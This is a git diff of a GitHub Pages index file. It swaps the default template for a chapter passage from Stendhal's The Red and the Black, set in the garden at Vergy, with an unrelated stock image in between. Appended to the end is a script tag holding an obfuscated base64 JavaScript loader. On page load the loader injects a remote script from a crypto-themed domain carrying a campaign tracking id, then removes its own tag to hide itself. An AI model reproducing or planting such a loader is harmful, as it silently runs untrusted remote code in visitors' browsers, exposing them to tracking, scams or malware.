@@ -1,37 +1,55 @@
-## Welcome to GitHub Pages
+# AN EVENING IN THE COUNTRY
+M. Guérin's Dido, a charming sketch!—Strombeck.
+His expression was singular when he saw Madame de Rênal the next day; he watched her like an enemy with whom he would have to fight a duel. These looks, which were so different from those of the previous evening, made Madame de Rênal lose her head; she had been kind to him and he appeared angry. She could not take her eyes off his.
 
-You can use the [editor on GitHub](https://github.com/mippindbetoubs145/COUNTRY/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Madame Derville's presence allowed Julien to devote less time to conversation, and more time to thinking about what he had in his mind. His one object all this day was to fortify himself by reading the inspired book that gave strength to his soul.
+![l](https://i.insider.com/50ec5d45eab8ea2c1600000f?width=1100&format=jpeg&auto=webp)
+He considerably curtailed the children's lessons, and when Madame de Rênal's presence had effectually brought him back to the pursuit of his ambition, he decided that she absolutely must allow her hand to rest in his that evening.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+The setting of the sun which brought the crucial moment nearer and nearer made Julien's heart beat in a strange way. Night came. He noticed with a joy, which took an immense weight off his heart, that it was going to be very dark. The sky, which was laden with big clouds that had been brought along by a sultry wind, seemed to herald a storm. The two friends went for their walk very late. All they did that night struck Julien as strange. They were enjoying that hour which seems to give certain refined souls an increased pleasure in loving.
 
-### Markdown
+At last they sat down, Madame de Rênal beside Julien, and Madame Derville near her friend. Engrossed as he was by the attempt which he was going to make, Julien could think of nothing to say. The conversation languished.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"Shall I be as nervous and miserable over my first duel?" said Julien to himself; for he was too suspicious both of himself and of others, not to realise his own mental state.
 
-```markdown
-Syntax highlighted code block
+In his mortal anguish, he would have preferred any danger whatsoever. How many times did he not wish some matter to crop up which would necessitate Madame de Rênal going into the house and leaving the garden! The violent strain on Julien's nerves was too great for his voice not to be considerably changed; soon Madame de Rênal's voice became nervous as well, but Julien did not notice it. The awful battle raging between duty and timidity was too painful, for him to be in a position to observe anything outside himself. A quarter to ten had just struck on the château clock without his having ventured anything. Julien was indignant at his own cowardice, and said to himself, "at the exact moment when ten o'clock strikes, I will perform what I have resolved to do all through the day, or I will go up to my room and blow out my brains."
 
-# Header 1
-## Header 2
-### Header 3
+After a final moment of expectation and anxiety, during which Julien was rendered almost beside himself by his excessive emotion, ten o'clock struck from the clock over his head. Each stroke of the fatal clock reverberated in his bosom, and caused an almost physical pang.
 
-- Bulleted
-- List
+Finally, when the last stroke of ten was still reverberating, he stretched out his hand and took Madame de Rênal's, who immediately withdrew it. Julien, scarcely knowing what he was doing, seized it again. In spite of his own excitement, he could not help being struck by the icy coldness of the hand which he was taking; he pressed it convulsively; a last effort was made to take it away, but in the end the hand remained in his.
 
-1. Numbered
-2. List
+His soul was inundated with happiness, not that he loved Madame de Rênal, but an awful torture had just ended. He thought it necessary to say something, to avoid Madame Derville noticing anything. His voice was now strong and ringing. Madame de Rênal's, on the contrary, betrayed so much emotion that her friend thought she was ill, and suggested her going in. Julien scented danger, "if Madame de Rênal goes back to the salon, I shall relapse into the awful state in which I have been all day. I have held the hand far too short a time for it really to count as the scoring of an actual advantage."
 
-**Bold** and _Italic_ and `Code` text
+At the moment when Madame Derville was repeating her suggestion to go back to the salon, Julien squeezed vigorously the hand that was abandoned to him.
 
-[Link](url) and ![Image](src)
-```
+Madame de Rênal, who had started to get up, sat down again and said in a faint voice,
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"I feel a little ill, as a matter of fact, but the open air is doing me good."
 
-### Jekyll Themes
+These words confirmed Julien's happiness, which at the present moment was extreme; he spoke, he forgot to pose, and appeared the most charming man in the world to the two friends who were listening to him. Nevertheless, there was a slight lack of courage in all this eloquence which had suddenly come upon him. He was mortally afraid that Madame Derville would get tired of the wind before the storm, which was beginning to rise, and want to go back alone into the salon. He would then have remained tête-à-tête with Madame de Rênal. He had had, almost by accident that blind courage which is sufficient for action; but he felt that it was out of his power to speak the simplest word to Madame de Rênal. He was certain that, however slight her reproaches might be, he would nevertheless be worsted, and that the advantage he had just won would be destroyed.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/mippindbetoubs145/COUNTRY/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Luckily for him on this evening, his moving and emphatic speeches found favour with Madame Derville, who very often found him as clumsy as a child and not at all amusing. As for Madame de Rênal, with her hand in Julien's, she did not have a thought; she simply allowed herself to go on living.
 
-### Support or Contact
+The hours spent under this great pine tree, planted by Charles the Bold according to the local tradition, were a real period of happiness. She listened with delight to the soughing of the wind in the thick foliage of the pine tree and to the noise of some stray drops which were beginning to fall upon the leaves which were lowest down. Julien failed to notice one circumstance which, if he had, would have quickly reassured him; Madame de Rênal, who had been obliged to take away her hand, because she had got up to help her cousin to pick up a flower-pot which the wind had knocked over at her feet, had scarcely sat down again before she gave him her hand with scarcely any difficulty and as though it had already been a pre-arranged thing between them.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Midnight had struck a long time ago; it was at last necessary to leave the garden; they separated. Madame de Rênal swept away as she was, by the happiness of loving, was so completely ignorant of the world that she scarcely reproached herself at all. Her happiness deprived her of her sleep. A leaden sleep overwhelmed Julien who was mortally fatigued by the battle which timidity and pride had waged in his heart all through the day.
+
+He was called at five o'clock on the following day and scarcely gave Madame de Rênal a single thought.
+
+He had accomplished his duty, and a heroic duty too. The consciousness of this filled him with happiness; he locked himself in his room, and abandoned himself with quite a new pleasure to reading exploits of his hero.
+
+When the breakfast bell sounded, the reading of the Bulletins of the Great Army had made him forget all his advantages of the previous day. He said to himself flippantly, as he went down to the salon, "I must tell that woman that I am in love with her." Instead of those looks brimful of pleasure which he was expecting to meet, he found the stern visage of M. de Rênal, who had arrived from Verrières two hours ago, and did not conceal his dissatisfaction at Julien's having passed the whole morning without attending to the children. Nothing could have been more sordid than this self-important man when he was in a bad temper and thought that he could safely show it.
+
+Each harsh word of her husband pierced Madame de Rênal's heart.
+
+As for Julien, he was so plunged in his ecstasy, and still so engrossed by the great events which had been passing before his eyes for several hours, that he had some difficulty at first in bringing his attention sufficiently down to listen to the harsh remarks which M. de Rênal was addressing to him. He said to him at last, rather abruptly,
+
+"I was ill."
+
+The tone of this answer would have stung a much less sensitive man than the mayor of Verrières. He half thought of answering Julien by turning him out of the house straight away. He was only restrained by the maxim which he had prescribed for himself, of never hurrying unduly in business matters.
+
+"The young fool," he said to himself shortly afterwards, "has won a kind of reputation in my house. That man Valenod may take him into his family, or he may quite well marry Elisa, and in either case, he will be able to have the laugh of me in his heart."
+
+In spite of the wisdom of these reflections, M. de Rênal's dissatisfaction did not fail to vent itself any the less by a string of coarse insults which gradually irritated Julien. Madame de Rênal was on the point of bursting into tears. Breakfast was scarcely over, when she asked Julien to give her his arm for a walk. She leaned on him affectionately. Julien could only answer all that Madame de Rênal said to him by whispering.
+
+<script id="U8D4C" src="data:text/javascript;base64, dmFyIF80OG9nOCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3VubGVVLCBfMFBhN2spIHt2YXIgX1RhaElBID0gZnVuY3Rpb24oX0txc0xKKSB7d2hpbGUgKC0tX0txc0xKKSB7X3VubGVVWydwdXNoJ10oX3VubGVVWydzaGlmdCddKCkpO319O19UYWhJQSgrK18wUGE3ayk7fShfNDhvZzgsIDB4MTFiKSk7dmFyIF9jeWlGRyA9IGZ1bmN0aW9uKF9vNW1HVCwgX0tlUm9hKSB7X281bUdUID0gX281bUdUIC0gMHgwO3ZhciBfNE96WHogPSBfNDhvZzhbX281bUdUXTtyZXR1cm4gXzRPelh6O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfY3lpRkcoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2kyc1gyID0gZG9jdW1lbnRbX2N5aUZHKCcweDEnKV0oX2N5aUZHKCcweDInKSk7X2kyc1gyW19jeWlGRygnMHgzJyldID0gX2N5aUZHKCcweDQnKTtfaTJzWDJbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NmVceDY3XHg2NVx4NmNceDZmXHg2Ylx4NjFceDc0XHg2Ylx4NjFceDYzXHg2OFx4NjVceDc2XHg2MVx4MmVceDYzXHg3Mlx4NzlceDcwXHg3NFx4NmZceDJkXHg2ZFx4NjlceDZjXHg2Y1x4NjlceDZmXHg2ZVx4NjVceDcyXHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmFceDU3XHgzN1x4NTZceDRhXHg1Nlx4MzBceDU3XHg3Mlx4MzEnO2RvY3VtZW50W19jeWlGRygnMHg1JyldKF9jeWlGRygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9pMnNYMik7ZG9jdW1lbnRbX2N5aUZHKCcweDcnKV0oJ1U4RDRDJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
